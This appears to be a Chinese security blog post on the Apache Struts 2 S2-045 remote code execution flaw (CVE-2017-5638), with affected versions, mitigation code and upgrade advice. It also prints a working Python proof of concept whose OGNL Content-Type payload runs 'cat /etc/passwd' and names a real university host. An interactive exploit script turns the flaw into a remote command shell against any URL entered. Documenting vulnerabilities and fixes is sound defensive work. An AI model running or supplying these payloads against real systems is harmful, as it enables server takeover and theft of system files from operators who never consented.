<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><h3 id="基于-Jakarta-plugin插件的Struts远程代码执行漏洞"><a href="#基于-Jakarta-plugin插件的Struts远程代码执行漏洞" class="headerlink" title="基于 Jakarta plugin插件的Struts远程代码执行漏洞"></a>基于 Jakarta plugin插件的Struts远程代码执行漏洞</h3><h2 id="官方评级"><a href="#官方评级" class="headerlink" title="官方评级"></a>官方评级</h2><h3 id="高危"><a href="#高危" class="headerlink" title="高危"></a>高危</h3><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"><a href="#Apache-Struts-2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令" class="headerlink" title="Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令"></a>Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</h3><h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式"></a>漏洞利用条件和方式</h2><h3 id="黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。"><a href="#黑客通过Jakarta-文件上传插件实现远程利用该漏洞执行代码。" class="headerlink" title="黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。"></a>黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</h3><p>1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能<br>2.恶意攻击者精心构造Content-Type的值</p>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><h3 id="Struts-2-3-5-–-Struts-2-3-31"><a href="#Struts-2-3-5-–-Struts-2-3-31" class="headerlink" title="Struts 2.3.5 – Struts 2.3.31"></a>Struts 2.3.5 – Struts 2.3.31</h3><pre><code>Struts 2.5 – Struts 2.5.10
Created by Lukasz Lenart, last modified yesterday at 01:14 PM
</code></pre><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span>
<span class="token comment" spellcheck="true"># encoding:utf-8</span>
<span class="token keyword">import</span> urllib2
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> poster<span class="token punctuation">.</span>encode <span class="token keyword">import</span> multipart_encode
<span class="token keyword">from</span> poster<span class="token punctuation">.</span>streaminghttp <span class="token keyword">import</span> register_openers

header1 <span class="token operator">=</span><span class="token punctuation">{</span>
<span class="token string">"Host"</span><span class="token punctuation">:</span><span class="token string">"alumnus.shu.edu.cn"</span><span class="token punctuation">,</span>
<span class="token string">"Connection"</span><span class="token punctuation">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">,</span>
<span class="token string">"Refer"</span><span class="token punctuation">:</span><span class="token string">"alumnus.shu.edu.cn"</span><span class="token punctuation">,</span>
<span class="token string">"Accept"</span><span class="token punctuation">:</span><span class="token string">"*/*"</span><span class="token punctuation">,</span>
<span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span><span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span>
<span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span><span class="token string">"deflate"</span><span class="token punctuation">,</span>
<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span><span class="token string">"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    register_openers<span class="token punctuation">(</span><span class="token punctuation">)</span>
    datagen<span class="token punctuation">,</span> header <span class="token operator">=</span> multipart_encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"image1"</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">"tmp.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    header<span class="token punctuation">[</span><span class="token string">"User-Agent"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>
    header<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token triple-quoted-string string">'''%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}'''</span>
    request <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>datagen<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>
    <span class="token keyword">print</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>




poc<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">
<span class="token comment" spellcheck="true"># coding:utf-8</span>
<span class="token keyword">import</span> requests<span class="token punctuation">,</span>json<span class="token punctuation">,</span>re

<span class="token keyword">def</span> <span class="token function">Poc</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16'</span><span class="token punctuation">,</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span><span class="token punctuation">}</span>
    headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> "<span class="token operator">%</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token comment" spellcheck="true">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \</span>
                          <span class="token string">"+command+"</span><span class="token string">').(#iswin=(@java.lang.System@getProperty('</span>os<span class="token punctuation">.</span>name<span class="token string">').toLowerCase().contains('</span>win<span class="token string">'))).(#cmds=(#iswin?{'</span>cmd<span class="token punctuation">.</span>exe<span class="token string">','</span><span class="token operator">/</span>c<span class="token string">',#cmd}:{'</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash<span class="token string">','</span><span class="token operator">-</span>c'<span class="token punctuation">,</span>#cmd<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token operator">=</span>new java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder<span class="token punctuation">(</span>#cmds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token punctuation">.</span>redirectErrorStream<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#process<span class="token operator">=</span>#p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ros<span class="token operator">=</span><span class="token punctuation">(</span>@org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>struts2<span class="token punctuation">.</span>ServletActionContext@getResponse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getOutputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>@org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils@copy<span class="token punctuation">(</span>#process<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#ros<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ros<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>"

    data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"image1"</span><span class="token punctuation">:</span>url<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">if</span> req<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> req<span class="token punctuation">.</span>content
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">,</span>e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> e

th <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"url"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> th<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>
        input_cmd <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"cmd >>: "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> input_cmd <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> input_cmd <span class="token operator">==</span> <span class="token string">'set'</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"set url :"</span><span class="token punctuation">)</span>
            th<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span> <span class="token operator">=</span> url
        <span class="token keyword">elif</span> input_cmd <span class="token operator">==</span> <span class="token string">'show url'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> th<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            Poc<span class="token punctuation">(</span>th<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>input_cmd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"set url :"</span><span class="token punctuation">)</span>
        th<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span> <span class="token operator">=</span> url
</code></pre>
<h2 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h2><h3 id="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"><a href="#通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。" class="headerlink" title="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"></a>通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。</h3><p></p><p class="code-caption" data-lang="java" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>Filter<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>FilterChain<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>FilterConfig<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletException<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletRequest<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletResponse<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServlet<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityFilter</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>

    <span class="token comment" spellcheck="true">/**
     * 
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 1L<span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token keyword">final</span> String www_url_encode<span class="token operator">=</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">final</span> String mul_data<span class="token operator">=</span> <span class="token string">"multipart/form-data "</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">final</span> String txt_pla<span class="token operator">=</span> <span class="token string">"text/plain"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest arg0<span class="token punctuation">,</span> ServletResponse arg1<span class="token punctuation">,</span>
            FilterChain arg2<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>

        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> arg0<span class="token punctuation">;</span>
        HttpServletResponse response <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletResponse<span class="token punctuation">)</span> arg1<span class="token punctuation">;</span>

        String contenType<span class="token operator">=</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"conTent-type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>contenType<span class="token operator">!=</span>null<span class="token operator">&amp;&amp;</span><span class="token operator">!</span>contenType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span>contenType<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>www_url_encode<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span>contenType<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>mul_data<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span>contenType<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>txt_pla<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

            response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"非法请求Content-Type！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        arg2<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig arg0<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<h3 id="将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下"><a href="#将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下" class="headerlink" title="将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下"></a>将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下</h3><h3 id="⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中"><a href="#⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中" class="headerlink" title="⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中"></a>⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>filter<span class="token operator">></span>
    <span class="token operator">&lt;</span>filter-name<span class="token operator">></span>SecurityFilter<span class="token operator">&lt;</span>/filter-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>filter-class<span class="token operator">></span>SecurityFilter<span class="token operator">&lt;</span>/filter-class<span class="token operator">></span>
  <span class="token operator">&lt;</span>/filter<span class="token operator">></span>
<span class="token operator">&lt;</span>filter-mapping<span class="token operator">></span>
    <span class="token operator">&lt;</span>filter-name<span class="token operator">></span>SecurityFilter<span class="token operator">&lt;</span>/filter-name<span class="token operator">></span>
    <span class="token operator">&lt;</span>url-pattern<span class="token operator">></span>/*<span class="token operator">&lt;</span>/url-pattern<span class="token operator">></span>
<span class="token operator">&lt;</span>/filter-mapping<span class="token operator">></span>
</code></pre>
<h3 id="代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。"><a href="#代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。" class="headerlink" title="/代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。"></a>/<em>代表拦截所有请求，进行攻击代码检查，</em>.action只检查.action结尾的请求。</h3><h3 id="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器"><a href="#如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器" class="headerlink" title="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器"></a>如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 <a href="https://repository.apache.org/content/groups/staging/org/apache/struts/struts2-core/2.3.32/" target="_blank" rel="external">Apache Struts 2.3.32</a>或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器</h3><h3 id="重启应用即可"><a href="#重启应用即可" class="headerlink" title="重启应用即可"></a>重启应用即可</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;a href=&quot;#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot; class=&quot;headerlink&quot; title=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;/a&gt;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&lt;/h3&gt;&lt;h2 id=&quot;漏洞编号&quot;&gt;&lt;a href=&quot;#漏洞编号&quot; class=&quot;headerlink&quot; title=&quot;漏洞编号&quot;&gt;&lt;/a&gt;漏洞编号&lt;/h2&gt;&lt;h3 id=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;a href=&quot;#S2-045，CVE-2017-5638&quot; class=&quot;headerlink&quot; title=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;/a&gt;S2-045，CVE-2017-5638&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="S2-045" scheme="http://iosmosis.github.io/tags/S2-045/"/>
    
      <category term="poc" scheme="http://iosmosis.github.io/tags/poc/"/>
    
      <category term="exp" scheme="http://iosmosis.github.io/tags/exp/"/>
    
  </entry>
  
</feed>
